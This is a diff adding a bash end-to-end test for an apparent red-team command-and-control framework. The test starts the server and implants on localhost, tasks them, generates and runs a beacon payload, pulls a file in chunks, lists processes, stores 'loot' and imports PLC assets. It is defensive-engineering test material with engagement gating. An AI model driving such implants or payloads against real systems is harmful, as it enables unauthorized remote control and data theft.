@@ -1,0 +1,331 @@
+#!/usr/bin/env bash
+# End-to-end smoke test: real server + real implants over mTLS and HTTPS.
+#
+# Verifies registration (protocol v2), task round-trips on both carriers,
+# persistence, and the session/task history endpoints. Requires curl, python3,
+# and generated certs (scripts/setup-ca.sh).
+set -euo pipefail
+
+ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+cd "$ROOT"
+
+BASE_PORT="${PC2_E2E_PORT:-14444}"
+API_PORT=$((BASE_PORT + 1))
+METRICS_PORT=$((BASE_PORT + 2))
+HTTPS_PORT=$((BASE_PORT + 3))
+
+for f in certs/server-cert.pem certs/server-key.pem certs/ca-cert.pem \
+         certs/implant-cert.pem certs/implant-key.pem; do
+  if [ ! -f "$f" ]; then
+    echo "missing $f; run scripts/setup-ca.sh first" >&2
+    exit 1
+  fi
+done
+
+make build >/dev/null
+go build -o bin/implant ./cmd/implant
+
+DB="$(mktemp /tmp/pc2-e2e-XXXXXX.db)"
+SERVER_LOG="$(mktemp /tmp/pc2-server-XXXX.log)"
+IMPLANT_LOG="$(mktemp /tmp/pc2-implant-XXXX.log)"
+HTTPS_IMPLANT_LOG="$(mktemp /tmp/pc2-implant-https-XXXX.log)"
+BUILT_LOG="$(mktemp /tmp/pc2-implant-built-XXXX.log)"
+BUILT_PAYLOAD="$(mktemp -d /tmp/pc2-built-XXXXXX)/built-implant"
+LOOT_DIR="$(mktemp -d /tmp/pc2-loot-XXXXXX)"
+SRV=""
+IMP=""
+IMP2=""
+IMP3=""
+
+cleanup() {
+  if [ -n "$SRV" ]; then kill "$SRV" 2>/dev/null || true; fi
+  if [ -n "$IMP" ]; then kill "$IMP" 2>/dev/null || true; fi
+  if [ -n "$IMP2" ]; then kill "$IMP2" 2>/dev/null || true; fi
+  if [ -n "$IMP3" ]; then kill "$IMP3" 2>/dev/null || true; fi
+  wait 2>/dev/null || true
+  rm -f "$DB"
+  rm -rf "$(dirname "$BUILT_PAYLOAD")" "$LOOT_DIR"
+}
+trap cleanup EXIT
+
+PC2_LOOT_DIR="$LOOT_DIR" ./bin/private-c2-server \
+  --listen "127.0.0.1:${BASE_PORT}" \
+  --api "127.0.0.1:${API_PORT}" \
+  --metrics-addr "127.0.0.1:${METRICS_PORT}" \
+  --https-listen "127.0.0.1:${HTTPS_PORT}" \
+  --https-path /api/c2 \
+  --db "$DB" \
+  --cert certs/server-cert.pem \
+  --key certs/server-key.pem \
+  --ca certs/ca-cert.pem >"$SERVER_LOG" 2>&1 &
+SRV=$!
+
+sleep 1
+
+./bin/implant \
+  --server "127.0.0.1:${BASE_PORT}" \
+  --ca certs/ca-cert.pem \
+  --cert certs/implant-cert.pem \
+  --key certs/implant-key.pem \
+  --interval 1s \
+  --jitter 0 >"$IMPLANT_LOG" 2>&1 &
+IMP=$!
+
+./bin/implant \
+  --https-url "https://127.0.0.1:${HTTPS_PORT}/api/c2" \
+  --ca certs/ca-cert.pem \
+  --cert certs/implant-cert.pem \
+  --key certs/implant-key.pem \
+  --interval 1s \
+  --jitter 0 >"$HTTPS_IMPLANT_LOG" 2>&1 &
+IMP2=$!
+
+sleep 3
+
+API="http://127.0.0.1:${API_PORT}"
+TOKEN="$(curl -fsS -X POST "$API/api/auth/login" \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"admin"}' |
+  python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])')"
+
+SESSIONS="$(curl -fsS "$API/api/sessions" -H "Authorization: Bearer $TOKEN")"
+SID="$(printf '%s' "$SESSIONS" | python3 -c '
+import sys, json
+sessions = json.load(sys.stdin)
+assert sessions, "no sessions registered"
+transports = {s.get("transport") for s in sessions}
+assert {"mtls", "https"} <= transports, f"expected mtls and https sessions, got {transports}"
+s = next(s for s in sessions if s.get("transport") == "mtls")
+assert s.get("protocol_version") == 2, f"expected protocol v2, got {s.get('protocol_version')}"
+print(s["id"])
+')"
+
+TASK="$(curl -fsS -X POST "$API/api/sessions/$SID/task" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{"type":"pwd","args":""}')"
+TID="$(printf '%s' "$TASK" | python3 -c 'import sys,json; print(json.load(sys.stdin)["task_id"])')"
+
+RESULT=""
+for _ in $(seq 1 30); do
+  RESULT="$(curl -fsS "$API/api/tasks/$TID" -H "Authorization: Bearer $TOKEN")"
+  if ! printf '%s' "$RESULT" | grep -q '"status":"pending"'; then
+    break
+  fi
+  sleep 0.5
+done
+
+printf '%s' "$RESULT" | python3 -c '
+import sys, json
+r = json.load(sys.stdin)
+assert r.get("success") is True, f"task failed: {r}"
+assert r.get("output", "").strip(), "task returned empty output"
+'
+
+HISTORY="$(curl -fsS "$API/api/sessions/history" -H "Authorization: Bearer $TOKEN")"
+printf '%s' "$HISTORY" | python3 -c '
+import sys, json
+rows = json.load(sys.stdin)
+assert any(r["id"] == "'"$SID"'" for r in rows), "session not persisted in history"
+'
+
+TASKS="$(curl -fsS "$API/api/sessions/$SID/tasks" -H "Authorization: Bearer $TOKEN")"
+printf '%s' "$TASKS" | python3 -c '
+import sys, json
+rows = json.load(sys.stdin)
+assert any(t["id"] == "'"$TID"'" and t["state"] == "completed" for t in rows), "task not persisted as completed"
+'
+
+HSID="$(printf '%s' "$SESSIONS" | python3 -c '
+import sys, json
+sessions = json.load(sys.stdin)
+print(next(s["id"] for s in sessions if s.get("transport") == "https"))
+')"
+
+HTASK="$(curl -fsS -X POST "$API/api/sessions/$HSID/task" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{"type":"pwd","args":""}')"
+HTID="$(printf '%s' "$HTASK" | python3 -c 'import sys,json; print(json.load(sys.stdin)["task_id"])')"
+
+HRESULT=""
+for _ in $(seq 1 30); do
+  HRESULT="$(curl -fsS "$API/api/tasks/$HTID" -H "Authorization: Bearer $TOKEN")"
+  if ! printf '%s' "$HRESULT" | grep -q '"status":"pending"'; then
+    break
+  fi
+  sleep 0.5
+done
+
+printf '%s' "$HRESULT" | python3 -c '
+import sys, json
+r = json.load(sys.stdin)
+assert r.get("success") is True, f"HTTPS task failed: {r}"
+assert r.get("output", "").strip(), "HTTPS task returned empty output"
+'
+
+PAYLOAD_JSON="$(curl -fsS -X POST "$API/api/payloads/generate" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{"target_os":"linux","target_arch":"amd64","format":"exe","mode":"beacon","transports":"mtls@127.0.0.1:'"${BASE_PORT}"'"}')"
+PAYLOAD_ID="$(printf '%s' "$PAYLOAD_JSON" | python3 -c 'import sys,json; print(json.load(sys.stdin)["id"])')"
+
+curl -fsS "$API/api/payloads/$PAYLOAD_ID/download" \
+  -H "Authorization: Bearer $TOKEN" -o "$BUILT_PAYLOAD"
+chmod +x "$BUILT_PAYLOAD"
+
+# The generated payload runs with no flags: its config, CA, and client
+# certificate are embedded.
+"$BUILT_PAYLOAD" >"$BUILT_LOG" 2>&1 &
+IMP3=$!
+
+sleep 6
+
+SESSIONS3="$(curl -fsS "$API/api/sessions" -H "Authorization: Bearer $TOKEN")"
+BSID="$(printf '%s' "$SESSIONS3" | python3 -c '
+import sys, json
+sessions = json.load(sys.stdin)
+match = [s for s in sessions if s.get("process") == "built-implant"]
+assert match, "built payload did not register; processes=" + str([s.get("process") for s in sessions])
+print(match[0]["id"])
+')"
+
+BTASK="$(curl -fsS -X POST "$API/api/sessions/$BSID/task" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{"type":"pwd","args":""}')"
+BTID="$(printf '%s' "$BTASK" | python3 -c 'import sys,json; print(json.load(sys.stdin)["task_id"])')"
+
+BRESULT=""
+for _ in $(seq 1 40); do
+  BRESULT="$(curl -fsS "$API/api/tasks/$BTID" -H "Authorization: Bearer $TOKEN")"
+  if ! printf '%s' "$BRESULT" | grep -q '"status":"pending"'; then
+    break
+  fi
+  sleep 0.5
+done
+
+printf '%s' "$BRESULT" | python3 -c '
+import sys, json
+r = json.load(sys.stdin)
+assert r.get("success") is True, f"built payload task failed: {r}"
+assert r.get("output", "").strip(), "built payload task returned empty output"
+'
+
+# Chunked download: stat then fetch the first chunk and compare it to the
+# local reference file. This exercises the bounded-transfer task types.
+REF_FILE=/etc/hostname
+STAT_TASK="$(curl -fsS -X POST "$API/api/sessions/$BSID/task" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d "{\"type\":\"download_stat\",\"args\":\"$REF_FILE\"}")"
+STAT_TID="$(printf '%s' "$STAT_TASK" | python3 -c 'import sys,json; print(json.load(sys.stdin)["task_id"])')"
+STAT_RES=""
+for _ in $(seq 1 40); do
+  STAT_RES="$(curl -fsS "$API/api/tasks/$STAT_TID" -H "Authorization: Bearer $TOKEN")"
+  if ! printf '%s' "$STAT_RES" | grep -q '"status":"pending"'; then break; fi
+  sleep 0.5
+done
+printf '%s' "$STAT_RES" | python3 -c 'import sys,json; r=json.load(sys.stdin); assert r["success"], r'
+
+CHUNK_ARGS="$(python3 -c 'import json,sys; print(json.dumps({"path":sys.argv[1],"offset":0,"length":65536}))' "$REF_FILE")"
+CHUNK_TASK="$(curl -fsS -X POST "$API/api/sessions/$BSID/task" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d "$(python3 -c 'import json,sys; print(json.dumps({"type":"download_chunk","args":sys.argv[1]}))' "$CHUNK_ARGS")")"
+CHUNK_TID="$(printf '%s' "$CHUNK_TASK" | python3 -c 'import sys,json; print(json.load(sys.stdin)["task_id"])')"
+CHUNK_RES=""
+for _ in $(seq 1 40); do
+  CHUNK_RES="$(curl -fsS "$API/api/tasks/$CHUNK_TID" -H "Authorization: Bearer $TOKEN")"
+  if ! printf '%s' "$CHUNK_RES" | grep -q '"status":"pending"'; then break; fi
+  sleep 0.5
+done
+printf '%s' "$CHUNK_RES" | python3 -c '
+import sys, json, base64
+r = json.load(sys.stdin)
+assert r.get("success") is True, r
+chunk = json.loads(r["output"])
+data = base64.b64decode(chunk["data"])
+ref = open("'"$REF_FILE"'", "rb").read()
+assert data == ref, "chunked download mismatch"
+'
+
+# General process metadata must run even without a privilege capability.
+PINFO_TASK="$(curl -fsS -X POST "$API/api/sessions/$BSID/task" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{"type":"process_info","args":""}')"
+PINFO_TID="$(printf '%s' "$PINFO_TASK" | python3 -c 'import sys,json; print(json.load(sys.stdin)["task_id"])')"
+PINFO_RES=""
+for _ in $(seq 1 40); do
+  PINFO_RES="$(curl -fsS "$API/api/tasks/$PINFO_TID" -H "Authorization: Bearer $TOKEN")"
+  if ! printf '%s' "$PINFO_RES" | grep -q '"status":"pending"'; then break; fi
+  sleep 0.5
+done
+printf '%s' "$PINFO_RES" | python3 -c '
+import sys, json
+r = json.load(sys.stdin)
+assert r.get("success") is True, r
+procs = json.loads(r["output"])["processes"]
+assert procs and all(p["pid"] > 0 for p in procs), "process_info returned no usable processes"
+'
+
+# A session with no engagement must be refused privilege-gated tasking before
+# anything reaches the implant.
+GATED_STATUS="$(curl -sS -o /dev/null -w '%{http_code}' -X POST "$API/api/sessions/$BSID/task" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{"type":"token_list","args":""}')"
+if [ "$GATED_STATUS" != "403" ]; then
+  echo "expected 403 for token_list without an engagement, got $GATED_STATUS" >&2
+  exit 1
+fi
+
+# Loot store: create an engagement, store a blob, list it, download it, and
+# delete it. The blob round-trip proves the metadata/blob split works.
+ENG_ID="$(curl -fsS -X POST "$API/api/engagements" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{"name":"e2e-loot","status":"active","authorization_ref":"E2E","allow_ot_assessment":true}' |
+  python3 -c 'import sys,json; print(json.load(sys.stdin)["id"])')"
+
+LOOT_DATA="$(printf 'loot-%s' "$ENG_ID" | base64 -w0)"
+LOOT_JSON="$(curl -fsS -X POST "$API/api/loot" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d "{\"engagement_id\":\"$ENG_ID\",\"kind\":\"file\",\"name\":\"e2e.txt\",\"data\":\"$LOOT_DATA\"}")"
+LOOT_ID="$(printf '%s' "$LOOT_JSON" | python3 -c 'import sys,json; print(json.load(sys.stdin)["id"])')"
+
+curl -fsS "$API/api/loot/$LOOT_ID/download" -H "Authorization: Bearer $TOKEN" \
+  | python3 -c '
+import sys, base64
+assert sys.stdin.buffer.read().decode() == base64.b64decode("'"$LOOT_DATA"'").decode(), "loot download mismatch"
+'
+
+curl -fsS -X DELETE "$API/api/loot/$LOOT_ID" -H "Authorization: Bearer $TOKEN" >/dev/null
+MISSING_STATUS="$(curl -sS -o /dev/null -w '%{http_code}' "$API/api/loot/$LOOT_ID" \
+  -H "Authorization: Bearer $TOKEN")"
+if [ "$MISSING_STATUS" != "404" ]; then
+  echo "expected 404 for deleted loot, got $MISSING_STATUS" >&2
+  exit 1
+fi
+
+# OT import + report: persist a read-only finding and render a Markdown report.
+curl -fsS -X POST "$API/api/ot/import" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d "{\"engagement_id\":\"$ENG_ID\",\"type\":\"asset\",\"items\":[{\"ip\":\"10.10.0.5\",\"vendor\":\"Siemens\",\"role\":\"PLC\",\"protocols\":[\"s7\"]}]}" \
+  | python3 -c 'import sys,json; r=json.load(sys.stdin); assert r["created"]==1, r'
+
+OT_REPORT="$(curl -fsS -X POST "$API/api/ot/reports" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d "{\"engagement_id\":\"$ENG_ID\",\"format\":\"markdown\",\"title\":\"E2E OT\"}")"
+printf '%s' "$OT_REPORT" | python3 -c '
+import sys, json
+r = json.load(sys.stdin)
+assert r["asset_count"] == 1, r
+assert "# E2E OT" in r["report_data"], "report is not Markdown"
+'
+
+echo "E2E OK: mTLS $SID/$TID; HTTPS $HSID/$HTID; built payload $BSID/$BTID; chunked download OK; process_info OK; gated tasking denied; loot round-trip OK; OT import/report OK"
